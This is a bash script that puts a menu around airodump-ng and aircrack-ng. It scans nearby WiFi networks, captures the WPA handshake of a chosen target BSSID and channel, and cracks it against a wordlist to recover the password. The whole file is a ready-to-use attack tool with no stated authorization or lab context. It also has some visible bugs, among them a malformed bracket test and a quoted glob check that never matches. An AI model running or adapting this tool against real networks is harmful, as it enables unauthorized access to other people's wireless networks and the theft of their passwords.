#! /bin/bash
WLANNM=$(cat /root/lscript/wlanmon.txt)
export WLANNM
#############DEFAULTS###############
#setting yellow-start 
YS="\e[1;33m"
#setting color-end
CE="\e[0m"
#setting red-start
RS="\e[1;31m"
#setting frequent stings
YNYES="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=yes)"
YNNO="("$YS"y"$CE"/"$YS"n"$CE")("$YS"Enter"$CE"=no)"
YNONLY="("$YS"y"$CE"/"$YS"n"$CE")"
PAKT="Press "$YS"any key$CE to"
PAKTC="Press "$YS"any key$CE to continue..."
PAKTGB="Press "$YS"any key$CE to go back..."

####################################
#-----------------FUNCTIONS-----------------
function scan_networks
{
FJC=0
airodump-ng $WLANNM
}
function validhandshake
{
echo -e "Did you capture the handshake?"$YNYES""
read HANDVALID
if [ "$HANDVALID" = "n"]
then
	echo -e "Removing the file..."
	rm $HANDFFP
	FJC=0
else
	FJC=1
fi
clear
}
function capture_handshake
{
AA=-1
echo -e "Enter your target's bssid: "
read -e TARGB
echo -e "Enter your target's channel: "
read -e TARGC
echo -e "Enter the name of the handshake file(no extension): "
echo -e "(don't use the same name twice)"
echo -e "Type "0" for no file"
read -e HANDF
HANDFFP="/root/handshakes/$HANDF-01.cap"
export HANDFFP
export TARGB
export TARGC
clear
if [ "$HANDF" != "0" ]
then
	gnome-terminal --geometry 70x10+0+0 -e lh2
	airodump-ng --bssid $TARGB -c $TARGC -w /root/handshakes/$HANDF $WLANNM
	validhandshake
	exec bash "$0"
else
	gnome-terminal --geometry 70x10+0+0 -e lh2
	airodump-ng --bssid $TARGB -c $TARGC $WLANNM
	echo -e "Start capturing on a file?"$YNYES""
	read SCF
	if [ "$SCF" = "n" ]
	then	
		clear
		exec bash "$0"
	else 
		echo -e "Enter the name of the handshake file(no extension): "
		echo -e "(don't use the same name twice)"
		read -e HANDF
		HANDFFP="/root/handshakes/$HANDF-01.cap"
		export HANDFFP
		gnome-terminal -e lh2
		airodump-ng --bssid $TARGB -c $TARGC -w /root/handshakes/$HANDF $WLANNM
		validhandshake
		exec bash "$0"
	fi
fi
}
function aircrack_handshakejust
{
	clear
	echo -e "Do you want to use the file you just captured?"$YNYES": "
	read -e YORN
	clear
	if [ "$YORN" = "n" ] 
	then
		cd /root/handshakes
		ls | sort
		cd
		echo -e "Enter handshake name(no extension)(on folder /root/handshakes/): "
		read -e HANDFK
		HANDFFK="/root/handshakes/$HANDFK-01.cap"
		if [ -f "$HANDFFK" ];
		then
			echo -e "OK."
			HANDFFP="$HANDFFK"
			sleep 1
			clear
		else
			echo -e "File $HANDFK does not exist"
			sleep 2
			clear
			exec bash "$0"
		fi
		cd /root/wordlists
		ls | sort
		cd
		echo -e "Enter wordlist name(include extension)(on folder /root/wordlists/): "
		read -e WORDF
		WORDFF="/root/wordlists/$WORDF"
		if [ -f "$WORDFF" ];
		then
			echo -e "OK."
			sleep 1
			clear
		else
			echo -e "File $WORDF does not exist"
			sleep 2
			clear
			exec bash "$0"
		fi
	else
		cd /root/wordlists
		ls | sort
		cd
		echo -e "Enter wordlist name(include extension)(on folder /root/wordlists/): "
		read -e WORDF
		WORDFF="/root/wordlists/$WORDF"
		if [ -f "$WORDFF" ];
		then
			echo -e "OK."
			sleep 1
		else
			echo -e "File $WORDF does not exist"
			sleep 2
			clear
			exec bash "$0"
		fi
	fi
	clear
	aircrack-ng -w $WORDFF $HANDFFP
}
function aircrack_handshake
{
	clear
	cd /root/handshakes
	ls | sort
	cd
	echo -e "Enter handshake name(include extension)(on folder /root/handshakes/): "
	read -e HANDFT
	HANDFFT="/root/handshakes/$HANDFT"
	if [ -f "$HANDFFT" ];
	then
		echo -e "OK."
		sleep 1
		clear
	else
		echo -e ""$RS"File $HANDFT does not exist"$CE""
		sleep 2
		clear
		exec bash "$0"
	fi
	cd /root/wordlists
	ls | sort
	cd
	echo -e "Enter wordlist name(include extension)(on folder /root/wordlists/): "
	read -e WORDF
	WORDFF="/root/wordlists/$WORDF"
	if [ -f "$WORDFF" ];
	then
		echo -e "OK."
		sleep 1
		clear
	else
		echo -e "File $WORDF does not exist"
		sleep 2
		clear
		exec bash "$0"
	fi

	clear
	aircrack-ng -w $WORDFF $HANDFFT
}

#-------------------------------------------
if [ -f "/root/handshakes/*.csv" ]
then
	rm /root/handshakes/*.csv
	rm /root/handshakes/*.netxml
fi
echo -e "----------------------------"$RS"HANDSHAKE"$CE"----------------------------"
echo -e ""$YS" 1"$CE") Scan networks nearby"
echo -e ""$YS" 2"$CE") Capture handshake"
echo -e ""$YS" 3"$CE") Aircrack the handshake"
echo -e ""$YS" 4"$CE") Remove .csv and .netxml files"
echo -e ""$YS" 0"$CE") EXIT"
echo -e " Choose: "
sleep 1
CH=0
read -e AA
if [ "$AA" = "1" ]
then
	clear
	CH=1
	scan_networks
elif [ "$AA" = "2" ]
then
	capture_handshake
elif [ "$AA" = "3" ]
then
	if [ "$FJC" = "1" ]
	then
	AAGAIN=1
	aircrack_handshakejust
	else
	AAGAIN=2
	aircrack_handshake
	fi
elif [ "$AA" = "4" ]
then
	rm /root/handshakes/*.csv
	rm /root/handshakes/*.netxml
	sleep 0.2
	clear
	exec bash "$0"
elif [ "$AA" = "0" ]
then
	exit
else
	clear
	echo -e "Wrong choice"
	sleep 0.3
	clear
	exec bash "$0"
fi
if [ "$CH" = "1" ]
then
	echo -e "Do you want to capture a handshake now?"$YNYES": "
	read CHCH
	if [ "$CHCH" = "n" ]
	then
	clear
	exec bash "$0"
	CH=0
	
	else
		capture_handshake
	fi
fi
echo -e "Choose again?"$YNYES": "
read -e BB
if [ -z "$BB" ]
then
	if [ "$AA" = "1" ]
		then
		exec bash "$0"
	else
		clear
		exec bash "$0"
	fi
elif [ "$BB" = "y" ]
then
	if [ "$AA" = "1" ]
		then
		exec bash "$0"
	else
		clear
		exec bash "$0"
	fi
else
	clear
	exit
fi
